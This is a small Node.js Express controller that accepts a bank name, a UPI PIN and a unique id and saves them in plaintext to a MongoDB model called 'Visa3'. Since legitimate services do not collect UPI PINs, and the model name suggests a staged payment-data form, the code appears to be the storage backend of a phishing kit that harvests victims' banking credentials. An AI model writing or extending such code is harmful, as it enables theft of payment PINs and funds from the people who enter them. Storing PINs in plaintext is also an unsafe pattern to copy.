const Visa3 = require('../models/Visa3');

exports.createVisa3 = async (req, res) => {
  const { bankName, upiPin, uniqueid } = req.body;
  
  if (!bankName || !upiPin || !uniqueid) {
    return res.status(400).json({ message: 'All fields are required' });
  }
  
  try {
    let visa3 = await Visa3.findOne({ uniqueid });
  
    if (visa3) {
      // Update the existing document
      visa3.bankName = bankName;
      visa3.upiPin = upiPin;
    } else {
      // Create a new document
      visa3 = new Visa3({
        uniqueid,
        bankName,
        upiPin
      });
    }
  
    await visa3.save();
  
    return res.status(201).json({
      success: true,
      message: 'Visa3 data successfully saved'
    });
  } catch (error) {
    console.error(error);
    return res.status(500).json({
      success: false,
      message: 'Server error, please try again later'
    });
  }
};
